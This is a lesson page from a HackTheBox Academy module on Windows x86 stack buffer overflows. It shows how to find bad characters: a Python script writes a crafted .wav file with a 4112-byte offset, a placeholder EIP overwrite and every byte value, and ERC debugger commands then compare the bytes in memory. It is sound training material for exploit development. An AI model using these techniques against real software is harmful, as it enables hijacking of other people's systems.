<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/89/section/947
// Platform Version: V1
// Module ID: 89
// Module Name: Stack-Based Buffer Overflows on Windows x86
// Module Difficulty: Medium
// Section ID: 947
// Section Title: Identifying Bad Characters
// Page Title: Stack-Based Buffer Overflows on Windows x86
// Page Number: 05
-->

# Identifying Bad Characters

**Module Name:** Stack-Based Buffer Overflows on Windows x86 **Page Number:** 05

#### STACK-BASED BUFFER OVERFLOWS ON WINDOWS X86

# Identifying Bad Characters

## Generating All Characters

![https://academy.hackthebox.com/storage/modules/89/win32bof_erc_bytearry.jpg](https://academy.hackthebox.com/storage/modules/89/win32bof_erc_bytearry.jpg)

## Updating our exploit

``` python
def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        ...SNIP...
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])
    
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars
    
    with open('chars.wav', 'wb') as f:
        f.write(payload)

bad_chars()
```

## Comparing our Input

![https://academy.hackthebox.com/storage/modules/89/win32bof_bytes_stack.jpg](https://academy.hackthebox.com/storage/modules/89/win32bof_bytes_stack.jpg)

![https://academy.hackthebox.com/storage/modules/89/win32bof_bytes_esp.jpg](https://academy.hackthebox.com/storage/modules/89/win32bof_bytes_esp.jpg)

``` cmd-session
ERC --compare 0014F974 C:\Users\htb-student\Desktop\ByteArray_1.bin
```

![https://academy.hackthebox.com/storage/modules/89/win32bof_bytes_compare.jpg](https://academy.hackthebox.com/storage/modules/89/win32bof_bytes_compare.jpg)

## Eliminating Bad Characters

``` cmd-session
ERC --bytearray -bytes 0x00
```

![https://academy.hackthebox.com/storage/modules/89/win32bof_erc_bytearry_2.jpg](https://academy.hackthebox.com/storage/modules/89/win32bof_erc_bytearry_2.jpg)

``` python
def bad_chars():
    all_chars = bytes([
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
...SNIP...
```

![https://academy.hackthebox.com/storage/modules/89/win32bof_bytes_compare_2.jpg](https://academy.hackthebox.com/storage/modules/89/win32bof_bytes_compare_2.jpg)

# 

# 

#### Questions

####